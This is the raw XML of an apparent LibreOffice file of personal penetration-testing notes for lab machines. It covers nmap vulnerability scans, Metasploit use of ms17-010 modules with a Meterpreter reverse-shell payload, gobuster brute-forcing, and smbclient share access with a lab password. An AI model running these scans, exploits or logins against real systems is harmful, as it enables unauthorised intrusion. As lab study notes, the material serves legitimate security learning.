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df5" officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00193a9f" officeooo:paragraph-rsid="00193a9f" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="001a1e5a"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0024a9c6"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5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34f3b" officeooo:paragraph-rsid="00234f3b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4a9c6" officeooo:paragraph-rsid="0024a9c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61842" officeooo:paragraph-rsid="00261842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b1f37" officeooo:paragraph-rsid="002b1f37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b4b97" officeooo:paragraph-rsid="002b4b97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c1f16" officeooo:paragraph-rsid="002c1f16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32329c" officeooo:paragraph-rsid="0032329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69c10" officeooo:paragraph-rsid="00369c10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70567" officeooo:paragraph-rsid="00370567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8b2f9" officeooo:paragraph-rsid="0038b2f9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a14dc" officeooo:paragraph-rsid="003a14d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3b8ba9" officeooo:paragraph-rsid="003b8ba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3e60cd" officeooo:paragraph-rsid="003e60cd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fda2a" officeooo:paragraph-rsid="003fda2a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41cc7d" officeooo:paragraph-rsid="0041cc7d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41cc7d" officeooo:paragraph-rsid="0044957d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436c91" officeooo:paragraph-rsid="00436c91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44296a" officeooo:paragraph-rsid="0044957d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4f1f02" officeooo:paragraph-rsid="004f1f02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502e50" officeooo:paragraph-rsid="00502e50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52003d" officeooo:paragraph-rsid="0052003d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525b1f" officeooo:paragraph-rsid="00525b1f" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0017ebf0" officeooo:paragraph-rsid="001a1e5a"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="001663a8" officeooo:paragraph-rsid="001b62d6"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="001fdd56" officeooo:paragraph-rsid="001fdd56"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002145f2" officeooo:paragraph-rsid="002145f2"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00234f3b" officeooo:paragraph-rsid="00234f3b"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0024a9c6" officeooo:paragraph-rsid="0024a9c6"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00251782" officeooo:paragraph-rsid="00251782"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00261842" officeooo:paragraph-rsid="00261842"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002751d6" officeooo:paragraph-rsid="002751d6"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0027ca3c" officeooo:paragraph-rsid="0027ca3c"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00298afe" officeooo:paragraph-rsid="00298afe"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002b1f37" officeooo:paragraph-rsid="002b1f37"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002b4b97" officeooo:paragraph-rsid="002b4b97"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002c1f16" officeooo:paragraph-rsid="002c1f16"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00318d28" officeooo:paragraph-rsid="00318d28"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0031a83b"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="00370567"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0038b2f9"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0044296a"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0044957d"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="00436c91"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0052003d"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0032329c" officeooo:paragraph-rsid="0032329c"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0032329c" officeooo:paragraph-rsid="0032329c"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00369c10" officeooo:paragraph-rsid="00369c10"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00370567" officeooo:paragraph-rsid="00370567"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="003a14dc" officeooo:paragraph-rsid="003a14dc"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="003b8ba9" officeooo:paragraph-rsid="003b8ba9"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="003e60cd" officeooo:paragraph-rsid="003e60cd"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="003fda2a" officeooo:paragraph-rsid="003fda2a"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="003fda2a" officeooo:paragraph-rsid="0044957d"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0041b5db" officeooo:paragraph-rsid="0044957d"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00436c91" officeooo:paragraph-rsid="00436c91"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0049959e" officeooo:paragraph-rsid="0049959e"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00502e50" officeooo:paragraph-rsid="00502e50"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0052003d" officeooo:paragraph-rsid="0052003d"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00522f01" officeooo:paragraph-rsid="00522f01"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00525b1f" officeooo:paragraph-rsid="00525b1f"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="0014fdf5" officeooo:paragraph-rsid="0014fdf5"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="00298afe" officeooo:paragraph-rsid="00298afe"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="002145f2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14fdf5" officeooo:paragraph-rsid="0014fdf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34f3b" officeooo:paragraph-rsid="00234f3b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31a83b" officeooo:paragraph-rsid="0031a83b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10pt" style:text-underline-style="none" officeooo:rsid="003b8ba9" officeooo:paragraph-rsid="003b8ba9" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0031a83b" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0044957d" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0041b5db" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" officeooo:rsid="0052003d" officeooo:paragraph-rsid="0052003d" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="003b8ba9" officeooo:paragraph-rsid="003b8ba9" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0031a83b" officeooo:paragraph-rsid="0041b5db" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0052003d" officeooo:paragraph-rsid="0052003d" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0031a83b"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0014fdf5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ebf73" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="002145f2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002145f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b514" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0024a9c6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00346238" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0043025e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="004ae36e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="00193a9f"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="001a1e5a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62d6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00465882" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="001cb514"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:text-position="super 58%"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties officeooo:rsid="002145f2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4a9c6"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="00289b8e"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0031a83b"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="0032ef60"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="00346238"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="003d785a"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="0041b5db"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="004658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Nmap:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">nmap -A -T4 -p- 10.10.10.134</text:p>
      <text:p text:style-name="P1">-A = All, services, OS, etc</text:p>
      <text:p text:style-name="P70"><text:span text:style-name="T1">-T4 = speed, T1 slower <text:s/>--&gt; </text:span><text:span text:style-name="T15"><text:s/></text:span><text:span text:style-name="T16">paranoid|sneaky|polite|normal|aggressive|insane</text:span></text:p>
      <text:p text:style-name="P1">-p- = scan all the ports</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Get only opened </text:span><text:span text:style-name="T4">ports</text:span><text:span text:style-name="T3">: <text:s/><text:tab/></text:span><text:span text:style-name="T2">sudo nmap -sS 10.10.10.134</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P9">Save the search:</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T16">nmap -A Pn -n 10.10.10.134 -oA</text:span> dc</text:p>
      <text:p text:style-name="P3">dc= saves the search on files named dc</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P32"><text:span text:style-name="T7">Run nmap script engine: <text:s/></text:span><text:span text:style-name="T17">Lets you to use the built in scripts or to create your onw. </text:span><text:span text:style-name="T14">Scripts are written in LUA. </text:span></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P33">CAREFULL, use only trusted scripts, not 3<text:span text:style-name="T20">rd</text:span> parties ones.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6"><text:span text:style-name="T19">Are located on: <text:s/></text:span><text:span text:style-name="T7">/usr/share/nmap/scripts/</text:span>smb-vuln-ms17-010.nse</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P31">In this example we run the script <text:span text:style-name="T1">smb-vuln-ms17-010.nse </text:span>which checks <text:span text:style-name="T13">if the target is vulnerable to ms17-010, it is not in for this host</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">nmap <text:span text:style-name="T7">--script</text:span> smb-vuln-ms17-010 -v 10.10.10.134 <text:s text:c="2"/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Host script results:</text:p>
      <text:p text:style-name="P3">|_smb-vuln-ms17-010: This system is patched.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T8">Get help: <text:s/></text:span><text:s/>nmap <text:span text:style-name="T7">--script-help</text:span> smb-vuln-ms17-010</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P73"><text:span text:style-name="T5">Use several scripts:</text:span><text:span text:style-name="T6"> <text:s/></text:span>nmap --script "ssh-*" <text:span text:style-name="T21">10.10.10.134</text:span></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://www.tecmint.com/use-nmap-script-engine-nse-scripts-in-linux/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.tecmint.com/use-nmap-script-engine-nse-scripts-in-linux/</text:a></text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P4">Get all live hosts:</text:p>
      <text:p text:style-name="P3">nmap <text:s/>-sn <text:s/>10.42.0.0/24</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">-<text:span text:style-name="T13">sn elude to scan ports, is doing only pings</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P3">sudo nmap -sS -sV --script=default,vuln -p- -T5 10.10.10</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P75">Metasploit:</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:span text:style-name="T9">Run Metasploit Framework C</text:span><text:span text:style-name="T7">onsole:</text:span> <text:s/>msfconsole</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P10">Search:</text:p>
      <text:p text:style-name="P36">search ms17-010 <text:s/>→ vulnerability of smb on microsoft, eternalblue</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T7">Check what is doing:</text:span> <text:span text:style-name="T23">Once you found the module you want you can get info about it </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T7">info</text:span> auxiliary/scanner/smb/smb_ms17_010</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P37"><text:span text:style-name="T7">Get (use) inside a module: <text:s text:c="5"/></text:span>use <text:span text:style-name="T1">auxiliary/scanner/smb/smb_ms17_010</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P11">Show options of the module:</text:p>
      <text:p text:style-name="P38">options </text:p>
      <text:p text:style-name="P38">show options <text:s/>→ both works the same</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P39"><text:span text:style-name="T7">Set the information requested:</text:span> <text:s/>like the remote host, local host, remote port, etc. </text:p>
      <text:p text:style-name="P39">You must be inside the module.</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T7">set</text:span> rhost 10.10.10.134</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P14">Set it globally:</text:p>
      <text:p text:style-name="P44">setg lhost 10.10.10.134</text:p>
      <text:p text:style-name="P44">setg lport <text:s/>4444</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P41">Remove the information set previously:</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T7">unset</text:span> rhost 10.10.10.134</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P45"><text:span text:style-name="T7">Search payloads:</text:span> related to the module in which you are.</text:p>
      <text:p text:style-name="P45">show payloads </text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P40"><text:span text:style-name="T7">Set payload:</text:span> use the tab to see all the payloads. <text:span text:style-name="T24">You probably will need to set the local host or port, check this with options.</text:span></text:p>
      <text:p text:style-name="P40">set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P12">Run the exploit:</text:p>
      <text:p text:style-name="P42">run</text:p>
      <text:p text:style-name="P42">exploit</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P13">Run the exploit again:</text:p>
      <text:p text:style-name="P43">rexploit</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P76">Gobuster:</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P15">Tool <text:span text:style-name="T26">to bruceforce:</text:span></text:p>
      <text:p text:style-name="P53"/>
      <text:list xml:id="list4047398404" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P54"><text:s text:c="4"/>URIs (directories and files) in web sites.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P54"><text:s text:c="4"/>DNS subdomains (with wildcard support)</text:p>
          <text:p text:style-name="P54"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P46"><text:span text:style-name="T10">Usage for version:</text:span><text:span text:style-name="T27"> </text:span>3.0.1-0kali1 </text:p>
      <text:p text:style-name="P46"><text:span text:style-name="T22"/></text:p>
      <text:p text:style-name="P16">Modes:</text:p>
      <text:p text:style-name="P55">dir <text:s/>→ urls </text:p>
      <text:p text:style-name="P55">dns → dns</text:p>
      <text:p text:style-name="P55">vhosts</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P17">Get help:</text:p>
      <text:p text:style-name="P56">gobuster help &lt;mode&gt;</text:p>
      <text:p text:style-name="P56">gobuster help dir</text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P47"><text:soft-page-break/></text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P47">gobuster dir -u http://10.10.10.123:80/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx" -o "/root/labs/10.10.10.123/scans/tcp_80_http_gobuster_big.txt"</text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P18">This works and do a copy of the output on <text:s/><text:span text:style-name="T25">tcp_80_http_gobuster_big.txt</text:span></text:p>
      <text:p text:style-name="P48">gobuster dir -u http://10.10.10.123:80/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx" -o "/root/Documents/gobuster_scans/10.10.10.123/tcp_80_http_gobuster_big.txt"</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46">gobuster <text:span text:style-name="T27">dir</text:span> -u 10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -x php,txt,html -t 15 -q</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P25">SMB:</text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P63">smbclient — ftp-like client to access SMB/CIFS resources on servers </text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P26">See smb fileshares on a host:</text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T16">smbclient </text:span>-L 10.10.10.123</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P79">noroot@kali:~/Documents$ <text:span text:style-name="T7">smbclient -L 10.10.10.123</text:span></text:p>
      <text:p text:style-name="P79">mkdir failed on directory /var/run/samba/msg.lock: Permission denied</text:p>
      <text:p text:style-name="P79">Unable to initialize messaging context</text:p>
      <text:p text:style-name="P79">Enter WORKGROUP\noroot's password: </text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"><text:tab/>Sharename <text:s text:c="8"/>Type <text:s text:c="5"/>Comment</text:p>
      <text:p text:style-name="P79"><text:tab/>--------- <text:s text:c="14"/>---- <text:s text:c="5"/>-------</text:p>
      <text:p text:style-name="P79"><text:tab/>print$ <text:s text:c="15"/>Disk <text:s text:c="5"/>Printer Drivers</text:p>
      <text:p text:style-name="P79"><text:tab/>Files <text:s text:c="17"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files <text:span text:style-name="T7">/etc/Files</text:span></text:p>
      <text:p text:style-name="P79"><text:tab/>general <text:s text:c="13"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files</text:p>
      <text:p text:style-name="P79"><text:tab/>Development <text:s text:c="4"/>Disk <text:s text:c="5"/>FriendZone Samba Server Files</text:p>
      <text:p text:style-name="P79"><text:tab/>IPC$ <text:s text:c="11"/>IPC <text:s text:c="6"/>IPC Service (FriendZone server (Samba, Ubuntu))</text:p>
      <text:p text:style-name="P79">Reconnecting with SMB1 for workgroup listing.</text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"><text:tab/>Server <text:s text:c="20"/>Comment <text:s text:c="3"/><text:span text:style-name="T7">→</text:span><text:span text:style-name="T11"> browse list</text:span></text:p>
      <text:p text:style-name="P79"><text:tab/>--------- <text:s text:c="22"/>-------</text:p>
      <text:p text:style-name="P79"><text:tab/>Workgroup <text:s text:c="15"/>Master</text:p>
      <text:p text:style-name="P79"><text:tab/>--------- <text:s text:c="10"/><text:tab/> <text:s text:c="7"/>-------</text:p>
      <text:p text:style-name="P79"><text:tab/>WORKGROUP <text:s text:c="6"/>FRIENDZONE</text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50">The browse list shows other SMB servers with resources to share on the network. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P24">Connect to the folder:</text:p>
      <text:p text:style-name="P50">smbclient \\\\<text:span text:style-name="T29">server</text:span>\\<text:span text:style-name="T29">shared_folder</text:span> mypasswd <text:s text:c="4"/>→<text:span text:style-name="T29">the path is </text:span><text:a xlink:type="simple" xlink:href="file://server/shared_folder" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T29">\\server\shared_folder</text:span></text:a><text:span text:style-name="T29"> but <text:s/>we are escaping the backslashes so we have to add \\\\ to have 2 backslashes for server and \\ for shared_folder</text:span></text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P62">Example:</text:p>
      <text:p text:style-name="P50">smbclient \\\\<text:span text:style-name="T29">10.10.10.123</text:span>\\<text:span text:style-name="T29">files</text:span> mypasswd</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P64">or if the folder doesn’t have password don’t add it on the smbclient command and press intro when is asking to introduce it once you have connected.</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P27">Get inside the fileshare with user and password:<text:span text:style-name="T16"> We are getting inside Development fileshare with admin and password WORK…..</text:span></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P49"><text:soft-page-break/>smbclient \\\\10.10.10.123\\Development --user=admin WORKWORKHhallelujah@#</text:p>
